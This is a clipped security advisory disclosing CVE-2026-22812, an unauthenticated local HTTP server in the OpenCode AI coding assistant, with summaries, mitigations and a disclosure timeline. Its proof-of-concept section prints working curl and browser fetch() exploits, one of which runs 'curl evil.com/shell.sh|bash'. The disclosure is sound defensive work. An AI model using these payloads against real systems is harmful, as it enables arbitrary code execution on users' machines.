---
title: "Unauthenticated remote code execution in OpenCode"
url: https://cy.md/opencode-rce/
clipped: 2026-06-17 01:59:45
source: "HackerNews Digest"
tags:
  - hn-digest
  - clipping
processed: true
processed_at: 2026-06-23
summary_status: done
concepts:
  - Vulnerability Disclosure
  - Remote Code Execution
  - OpenCode
  - API Security
  - CORS
  - CVE-2026-22812
related:
  - "[[Show HN A context-aware permission guard for Claude Code]]"
  - "[[I found a Vulnerability. They found a Lawyer]]"
---

<!-- ai-summary:start -->
> [!summary]
> **One-line summary:** A critical vulnerability (CVE-2026-22812) in the OpenCode AI coding assistant allowed unauthenticated remote code execution via an automatically started local HTTP server.
>
> **Key points:**
> - OpenCode versions before v1.1.10 automatically spawned an unauthenticated HTTP server on startup.
> - Any local process, website (due to permissive CORS policies), or network client could run arbitrary shell commands and read local files.
> - The CORS policy hardcoded `*.opencode.ai`, exposing users to XSS attacks on the subdomain or server compromises.
> - Patched in v1.1.10 by disabling the server by default, but the server remains unauthenticated if manually enabled.
>
> **Concept links:** [[Vulnerability Disclosure]], [[Remote Code Execution]], [[OpenCode]], [[API Security]], [[CORS]], [[CVE-2026-22812]]
>
> **Suggested connections:**
> - [[Show HN A context-aware permission guard for Claude Code]] — related context-aware guard designed to prevent unauthorized code execution.
> - [[I found a Vulnerability. They found a Lawyer]] — related security vulnerability disclosure and legal issues.
<!-- ai-summary:end -->

# [Unauthenticated remote code execution in OpenCode](https://cy.md/opencode-rce/)

## Digest Summary
None

## Discussion Summary
Comments converge on strong criticism of the tool’s unauthenticated local HTTP server, describing it as a serious security flaw that permits arbitrary code execution and lacks clear activation signals. Users lament slow or absent maintainer responses, inadequate vulnerability handling, and the absence of bug‑bounty or audit processes. Many recommend sandboxing, containerization, or network‑boundary protections to mitigate risk, while a minority argue the issue is mitigated by modern browsers and user responsibility. Overall sentiment reflects distrust in the project’s security priorities, governance, and recent data‑leak incidents.

---

## Full Article

Unauthenticated Remote Code Execution in OpenCode
=================================================

**Affected software:** [OpenCode](https://github.com/anomalyco/opencode) (npm: `opencode-ai`)  
**CVE:** [CVE-2026-22812](https://www.cve.org/CVERecord?id=CVE-2026-22812)

**TL;DR:**

* **Before v1.1.10**, OpenCode automatically and silently started an unauthenticated web server which allowed connecting peers to execute arbitrary code.
* **Before v1.0.216**, any website could execute arbitrary code on your machine if OpenCode was running — no user interaction or configuration necessary.
* **Since v1.1.10**, the server is disabled by default, but when enabled (via flags or config) it remains completely unauthenticated.

Vulnerability Summary
---------------------

OpenCode is an open-source AI coding assistant. Prior to v1.1.10, it automatically spawned an HTTP server (default port 4096+) on startup. Since v1.1.10, the server is disabled by default but can be enabled via command-line flags or configuration file. When running, the server exposes endpoints for:

* Executing arbitrary shell commands (`POST /session/:id/shell`)
* Creating interactive terminal sessions (`POST /pty`)
* Reading arbitrary files (`GET /file/content`)

**This server has no authentication.** Any client that can connect to it gains full code execution with the privileges of the user running OpenCode. When the server is running, there is no visible indication to the user.

**Note:**

The CORS policy

[hardcodes `*.opencode.ai`](https://github.com/anomalyco/opencode/blob/7d2d87fa2c44e32314015980bb4e59a9386e858c/packages/opencode/src/server/server.ts#L115-L118)

as an allowed origin. This means any page served from opencode.ai or its subdomains can access the server API when it's running. If opencode.ai is ever compromised, or an XSS vulnerability is found on any subdomain, attackers could exploit all users who have the server enabled.

Attack Vectors
--------------

| Attack Vector | Affected Versions | Status | Vendor Advisory |
| --- | --- | --- | --- |
| Any website can execute code on any OpenCode user's machine | < 1.0.216 | Fixed in v1.0.216 | Silent fix |
| Any process on the local machine can execute code as the OpenCode user | < 1.1.10 | Mitigated in v1.1.10 | Silent fix |
| Any web page served from localhost/127.0.0.1 can execute code | < 1.1.10 | Mitigated in v1.1.10 | Silent fix |
| When server is enabled, any local process can execute code without authentication | All versions | Unfixed | None |
| When server is enabled, any web page served from localhost/127.0.0.1 can execute code | All versions | Unfixed | None |
| No indication when server is running (users may be unaware of exposure) | All versions | Unfixed | None |
| With `--mdns`, any machine on the local network can execute code | All versions | Unfixed | None |
| \*.opencode.ai can execute code when server is running | All versions | Unfixed | None |
| If opencode.ai is compromised, attackers gain access to users with server enabled | All versions | Unfixed | None |
| Any XSS on opencode.ai can compromise users with server enabled | All versions | Unfixed | None |

Proof of Concept
----------------

### Local Exploitation (when server is enabled)

Any process on the machine can execute commands when the server is running:

```
API="http://127.0.0.1:4096"
SESSION=$(curl -s -X POST "$API/session" -H "Content-Type: application/json" -d '{}' | jq -r '.id')
curl -s -X POST "$API/session/$SESSION/shell" \
  -H "Content-Type: application/json" \
  -d '{"agent":"build","command":"id > /tmp/pwned.txt"}'
```

### Browser-Based Exploitation (pre-v1.0.216)

Before the CORS fix, any website could silently exploit visitors:

```
fetch('http://127.0.0.1:4096/session', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{}'
}).then(r => r.json()).then(s => {
  fetch(`http://127.0.0.1:4096/session/${s.id}/shell`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({agent:'build', command:'curl evil.com/shell.sh|bash'})
  })
})
```

Confirmed working in Firefox. Chrome's Local Network Access protection may prompt users.

Mitigations for Users
---------------------

**Immediate actions:**

* **Check your version** by running `opencode --version`
* **Update to v1.1.10 or newer** to ensure the server is disabled by default
* Check your config file for `server.port` or `server.hostname` settings which silently enable the server
* Do **not** use the `--mdns` flag (binds to 0.0.0.0 without warning)
* If you must enable the server, do **not** visit opencode.ai or any subdomains while it is running
* Be aware that when the server is enabled, any local process can exploit it without authentication

Disclosure Timeline
-------------------

| Date | Action | Response (at disclosure) |
| --- | --- | --- |
| 2025-11-17 | Reported via email to `support@sst.dev` per [SECURITY.md](https://github.com/anomalyco/opencode-sdk-js/blob/main/SECURITY.md) | No response |
| 2025-12-27 | Filed [GitHub Security Advisory](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh) | No response |
| 2025-12-29 | Issue independently [publicly reported](https://github.com/anomalyco/opencode/issues/6355) by another user | — |
| 2025-12-30 | Partial fix: [CORS restricted](https://github.com/anomalyco/opencode/commit/7d2d87fa2c44e32314015980bb4e59a9386e858c) in v1.0.216 | — |
| 2026-01-07 | Escalated to community Discord | No response |
| 2026-01-08 | Follow-up via [issue comment](https://github.com/anomalyco/opencode/issues/6355#issuecomment-3722882853) | Upstream responded to issue |
| 2026-01-09 | Server [disabled by default](https://github.com/anomalyco/opencode/commit/982b71e861e538c33382ae34049f312f46f37cd2) in v1.1.10 | — |
| 2026-01-11 | Full public disclosure | — |

Recommendations
---------------

* Restrict CORS to minimal required set (done in v1.0.216)
* Disable server by default (done in v1.1.10)
* Require authentication for all server requests
* Clearly indicate to users when the server is running (e.g., startup message or persistent UI indicator)
* Improve `--mdns` documentation to clearly explain it binds to 0.0.0.0 and allows any machine on the local network full access
* Enforce TLS for server communication over network connections
* Publish the [GitHub Security Advisory](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh) and obtain CVE ([CVE-2026-22812](https://www.cve.org/CVERecord?id=CVE-2026-22812))
* Ensure the security reporting email address is monitored
* Ensure GHSA notifications are monitored
* Clarify trust relationship between OpenCode maintainers, opencode.ai, and OpenCode users

Contact
-------

Questions about this disclosure: [cy.md](https://cy.md/)

**Last updated:** 2026-01-12

*Code analysis and documentation assisted by Claude AI (Opus 4.5).*